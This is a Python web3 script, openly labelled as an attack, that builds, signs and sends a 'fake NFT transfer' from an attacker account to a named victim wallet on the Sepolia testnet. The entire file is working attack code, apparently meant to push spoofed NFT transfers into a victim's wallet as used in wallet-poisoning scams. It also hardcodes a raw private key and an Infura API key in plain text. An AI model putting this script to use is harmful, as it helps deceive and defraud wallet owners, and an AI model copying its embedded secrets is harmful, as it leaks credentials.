from web3 import Web3
from eth_account import Account

# Infura Sepolia RPC
SEPOLIA_RPC = "https://sepolia.infura.io/v3/5d419af494974b80a1d4579ac1109ee7"
w3 = Web3(Web3.HTTPProvider(SEPOLIA_RPC))

# Attacker's private key
ATTACKER_PRIVATE_KEY = "35323c3059d40e3d07898e4e5223169660ece36054ff03fccbc1ecc2770ee60b"
attacker_account = w3.eth.account.from_key(ATTACKER_PRIVATE_KEY)

# Victim's wallet (target)
VICTIM_WALLET = "0xF4363726EA3141108314b8d9a76E8BE65F526e50"  

# Target NFT contract
NFT_CONTRACT = "0x7184138C866258f56ca78520951806Dda980c4D0"  

# Token ID to "fake transfer"
TOKEN_ID = 9999  

# Encode function call (transferFrom(attacker, victim, tokenId))
function_signature = Web3.keccak(text="transferFrom(address,address,uint256)")[:4]
data = (
    function_signature.hex()
    + w3.to_checksum_address(attacker_account.address)[2:].rjust(64, "0")
    + w3.to_checksum_address(VICTIM_WALLET)[2:].rjust(64, "0")
    + hex(TOKEN_ID)[2:].rjust(64, "0")
)

# Build transaction
tx = {
    "to": NFT_CONTRACT,
    "value": 0,
    "gas": 200000,
    "gasPrice": w3.eth.gas_price,
    "nonce": w3.eth.get_transaction_count(attacker_account.address),
    "chainId": 11155111,  # Sepolia
    "data": data,
}

# Sign & send transaction
signed_tx = attacker_account.sign_transaction(tx)
tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)  # ✅ Fix: Correct attribute name

print("Signed TX:", signed_tx.raw_transaction.hex())
print(f"Fake NFT Transfer Sent! Check: https://sepolia.etherscan.io/tx/{tx_hash.hex()}")
